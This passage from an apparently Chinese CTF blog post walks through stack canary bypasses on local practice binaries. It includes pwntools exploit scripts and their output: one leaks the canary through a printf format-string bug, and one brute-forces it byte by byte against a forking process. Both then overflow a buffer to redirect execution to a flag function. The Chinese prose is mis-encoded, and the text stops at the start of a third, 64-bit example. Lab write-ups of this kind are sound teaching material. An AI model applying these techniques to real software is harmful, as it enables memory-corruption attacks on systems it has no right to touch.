[ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  init();<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  fun();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__isoc99_scanf(&quot;%6s&quot;, format);</code>  scanfå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå‡½æ•°å‹æ ˆçš„æ—¶å€™ï¼Œæ˜¯ä»å³å‘å·¦å‹æ ˆçš„ã€‚</p><p>å¦‚ä¸‹å›¾çº¢æ¡†1ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨scanfä¹‹å‰ï¼Œpushäº†ä¸¤ä¸ªå€¼ï¼Œç¬¬ä¸€ä¸ªeax([ebp-0x12])æ˜¯formatçš„åœ°å€ï¼Œç¬¬äºŒä¸ª0x8048838æ˜¯â€%6sâ€ï¼Œæ‰€ä»¥formatåœ¨ebp-0x12çš„ä½ç½®ã€‚EBPä½äº0xffffd368ï¼Œæ‰€ä»¥formatåœ¨0xffffd356çš„ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">â””â”€<span class="hljs-comment"># python</span><br>Python <span class="hljs-number">3.11</span><span class="hljs-number">.4</span> (main, Jun  <span class="hljs-number">7</span> <span class="hljs-number">2023</span>, <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:09) [GCC <span class="hljs-number">12.2</span><span class="hljs-number">.0</span>] on linux<br><span class="hljs-type">Type</span> <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xffffd368</span> - <span class="hljs-number">0x12</span><br><span class="hljs-number">4294955862</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(<span class="hljs-number">4294955862</span>)<br><span class="hljs-string">&#x27;0xffffd356&#x27;</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾çº¢æ¡†2ï¼Œè¿è¡Œå®Œmain+39å’Œmain+40ä¹‹åï¼Œæ ˆä¸­æœ€è¿‘çš„ä¸¤ä¸ªå˜é‡å³ä¸ºscanfçš„ä¸¤ä¸ªå‚æ•°ï¼Œæ‰€ä»¥formatåœ¨0xffffd356çš„ä½ç½®ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904222955.png" alt="image.png"></p><p>ç»§ç»­è¿è¡Œï¼Œè¾“å…¥%p%p%p(å› ä¸ºåªèƒ½æ¥æ”¶6ä¸ªå­—ç¬¦)ï¼Œç›´åˆ°è¾“å‡ºprintf</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">pwndbg&gt; n<br><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><span class="hljs-built_in">%p</span><br>pwndbg&gt; n<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾ï¼Œæœ€ä¸Šé¢è¾“å‡ºçš„3ä¸ªåœ°å€ï¼Œå³ä¸ºprintfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²çš„3ä¸ªåœ°å€ï¼Œä»ä¸Šå¾€ä¸‹æ•°ï¼Œcanaryä½äºç¬¬7ä¸ªä½ç½®ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224257.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224357.png" alt="image.png"></p><p>å†æ¬¡éªŒè¯ä¸€ä¸‹<br>é€€å‡ºgdbè°ƒè¯•ï¼Œé‡æ–°è¿›å…¥ï¼Œè¿™æ¬¡è¾“å…¥%7$p</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224603.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºçš„åœ°å€å’Œcanaryçš„åœ°å€æ˜¯ä¸€æ ·çš„<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224636.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904224700.png" alt="image.png"></p><p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œæˆ‘æŠŠfunçš„ä»£ç å†ç²˜è´´ä¸€ä»½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„æ–¹å¼ï¼ŒæŸ¥æ‰¾bufå˜é‡åˆ°ebpçš„è·ç¦»ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°bufä¸º<code>ebp-70h</code>çš„ä½ç½®</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">pwndbg&gt; b <span class="hljs-function"><span class="hljs-keyword">fun</span></span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x80486f9</span><br>pwndbg&gt; r<br>Starting program: /root/ctf-practice/canary/<span class="hljs-number">01</span>/bin<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.<br>%<span class="hljs-number">7</span>$p<br><span class="hljs-number">0x9585b900</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230904225226.png" alt="image.png"></p><p>mainå’Œfunå‡½æ•°canaryåˆ°ebpçš„åç§»éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»funå‡½æ•°è¿›è¡Œæº¢å‡º</p><h2 id="æ ˆå¸§åˆ†æ"><a href="#æ ˆå¸§åˆ†æ" class="headerlink" title="æ ˆå¸§åˆ†æ"></a>æ ˆå¸§åˆ†æ</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">é»˜è®¤æ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     retaddr     </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string">     saved ebp   </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           |<span class="hljs-string">                 </span>|<br>                                0xc        |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------<br><br>ä¿®æ”¹åæ ˆå¸§<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (retaddr) åé—¨  </span>|<br>                                           +-----------------+<br>                                           |<span class="hljs-string"> (saved ebp)BBBB </span>|<br>                                    ebp---&gt;+-----------------+-----------------<br>                                           |<span class="hljs-string">      BBBB       </span>|<br>                                0xc        |<span class="hljs-string">      BBBB       </span>|<br>                                           |<span class="hljs-string">     canary      </span>|<br>                              ebp-0xc ---&gt; +-----------------+<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">     0x70</span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">      AAAA       </span>|<br>                                           |<span class="hljs-string">                 </span>|<span class="hljs-string">    </span><br><span class="hljs-string">                                           </span>|<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                                           |<span class="hljs-string">                 </span>|<br>                           ebp-0x70 buf---&gt;+-----------------+-----------------                               <br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#archä¹Ÿå¯ä»¥æ˜¯i386~çœ‹æ–‡ä»¶</span><br><br><br>p = process(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;%7$p&#x27;</span>  <span class="hljs-comment"># å¯ä»¥</span><br><span class="hljs-comment"># payload = &#x27;%7$x&#x27; # å¯ä»¥</span><br>p.sendline(payload)<br>canary = <span class="hljs-built_in">int</span>(p.recv(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary) <span class="hljs-comment"># p.recv()åº”è¯¥è¿”å›ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡int()å‡½æ•°å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨canaryå˜é‡ä¸­ã€‚</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex(canary): &quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag) # å¯ä»¥</span><br><span class="hljs-comment"># payload = b&#x27;a&#x27;*(0x70-0x0c) + p32(canary) + b&#x27;b&#x27;* 0xc + p32(getflag) # å¯ä»¥</span><br>payload = cyclic(<span class="hljs-number">0x70</span>-<span class="hljs-number">0x0c</span>) + p32(canary) + cyclic(<span class="hljs-number">0xc</span>) + p32(getflag) <span class="hljs-comment"># å¯ä»¥</span><br><br>p.send(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/01]</span><br><span class="hljs-string">â””â”€# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin&#x27;: pid 174011</span><br><span class="hljs-string">/root/ctf-practice/canary/01/exp.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.sendline(payload)</span><br><span class="hljs-string">canary:  4237685760</span><br><span class="hljs-string">hex(canary):  0xfc95f400</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/4657#toc-6">canaryçš„å„ç§å§¿åŠ¿â€”-pwné¢˜è§£ç‰ˆ</a>  é¢˜ç›®1</p><h1 id="02-é’ˆå¯¹forkçš„è¿›ç¨‹-32ä½ç¨‹åº"><a href="#02-é’ˆå¯¹forkçš„è¿›ç¨‹-32ä½ç¨‹åº" class="headerlink" title="02 é’ˆå¯¹forkçš„è¿›ç¨‹ (32ä½ç¨‹åº)"></a>02 é’ˆå¯¹forkçš„è¿›ç¨‹ (32ä½ç¨‹åº)</h1><h2 id="checksecåˆ†æ"><a href="#checksecåˆ†æ" class="headerlink" title="checksecåˆ†æ"></a>checksecåˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/02]<br>â””â”€<span class="hljs-comment"># checksec --file=bin1</span><br>[*] <span class="hljs-string">&#x27;/root/ctf-practice/canary/02/bin1&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/02]<br>â””â”€<span class="hljs-comment"># file bin1</span><br>bin1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=29de21cdd9a0496a8057313502c90562b715014b, not stripped<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/02]<br>â””â”€<span class="hljs-comment"># ./bin1</span><br>welcome<br>123456<br>recv sucess<br>welcome<br>qweasdzxc<br>recv sucess<br>welcome<br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112939.png" alt="image.png"></p><h2 id="åˆ†ææ¼æ´å‡½æ•°-1"><a href="#åˆ†ææ¼æ´å‡½æ•°-1" class="headerlink" title="åˆ†ææ¼æ´å‡½æ•°"></a>åˆ†ææ¼æ´å‡½æ•°</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">__pid_t</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  init();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v3 = fork();<br>    <span class="hljs-keyword">if</span> ( v3 &lt; <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v3 )<br>    &#123;<br>      wait(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;welcome&quot;</span>);<br>      fun();<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;recv sucess&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fork error&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getflag</span><span class="hljs-params">()</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+8h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  stream = fopen(<span class="hljs-string">&quot;./flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;get flag error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹forkè€Œè¨€ï¼Œä½œç”¨ç›¸å½“äºè‡ªæˆ‘å¤åˆ¶ï¼Œæ¯ä¸€æ¬¡å¤åˆ¶å‡ºæ¥çš„ç¨‹åºï¼Œå†…å­˜å¸ƒå±€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå½“ç„¶canaryå€¼ä¹Ÿä¸€æ ·ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥é€ä½çˆ†ç ´ï¼Œå¦‚æœç¨‹åºGGäº†å°±è¯´æ˜è¿™ä¸€ä½ä¸å¯¹ï¼Œå¦‚æœç¨‹åºæ­£å¸¸å°±å¯ä»¥æ¥ç€è·‘ä¸‹ä¸€ä½ï¼Œç›´åˆ°è·‘å‡ºæ­£ç¡®çš„canaryã€‚</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>,<span class="hljs-string">&#x27;-x&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<span class="hljs-comment">#archä¹Ÿå¯ä»¥æ˜¯i386~çœ‹æ–‡ä»¶</span><br><br>p = process(<span class="hljs-string">&#x27;./bin1&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        txt = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-comment"># print(&quot;txt: &quot;, txt)</span><br>        p.send(txt)<br>        a = p.recvuntil(<span class="hljs-string">&quot;welcome\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;recv&quot;</span> <span class="hljs-keyword">in</span> a:<br>            canary += <span class="hljs-built_in">bytes</span>([i])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary: &quot;</span>, canary)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;type(canary): &quot;</span>, <span class="hljs-built_in">type</span>(canary))<br>getflag = <span class="hljs-number">0x0804863B</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;getflag: &quot;</span>, getflag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p32(getflag): &quot;</span>, p32(getflag))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">100</span> + canary + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">12</span> + p32(getflag)<br>p.sendline(payload)<br>p.interactive()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">â””â”€# python exp.py</span><br><span class="hljs-string">[+] Starting local process &#x27;./bin1&#x27;: pid 248869</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  p.recvuntil(&#x27;welcome\n&#x27;)</span><br><span class="hljs-string">/root/ctf-practice/canary/02/exp.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="hljs-string">  a = p.recvuntil(&quot;welcome\n&quot;)</span><br><span class="hljs-string">canary:  b&#x27;\x00?&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2&#x27;</span><br><span class="hljs-string">canary:  b&#x27;\x00?\xb2a&#x27;</span><br><span class="hljs-string">type(canary):  &lt;class &#x27;bytes&#x27;&gt;</span><br><span class="hljs-string">getflag:  134514235</span><br><span class="hljs-string">p32(getflag):  b&#x27;;\x86\x04\x08&#x27;</span><br><span class="hljs-string">[*] Switching to interactive mode</span><br><span class="hljs-string">flag123</span><br><span class="hljs-string"></span><br><span class="hljs-string">welcome</span><br><span class="hljs-string">recv sucess</span><br><span class="hljs-string">welcome</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>debugæ¨¡å¼ä¸‹çš„è¾“å‡ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905112639.png" alt="image.png"></p><p>å½“è¾“å…¥<code>00 a6</code>çš„æ—¶å€™ï¼Œè¾“å‡º<code>stack smashing detected</code><br>å½“è¾“å…¥<code>00 a7</code>çš„æ—¶å€™ï¼Œè¾“å‡º<code>recv sucess</code></p><p>æ™®é€šæ‰§è¡Œè¾“å‡ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113121.png" alt="image.png"></p><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼ŒåŒä¸€ä¸ªç›®å½•ä¸‹æ”¾äº†ä¸€ä¸ªflagæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230905113230.png" alt="image.png"></p><h2 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/4657#toc-6">canaryçš„å„ç§å§¿åŠ¿â€”-pwné¢˜è§£ç‰ˆ</a>  é¢˜ç›®2</p><h1 id="03-64ä½"><a href="#03-64ä½" class="headerlink" title="03 (64ä½)"></a>03 (64ä½)</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~/ctf-practice/canary/03]<br>â””â”€<span class="hljs-comment"># checksec --file=babypie</span><br>[*] <span 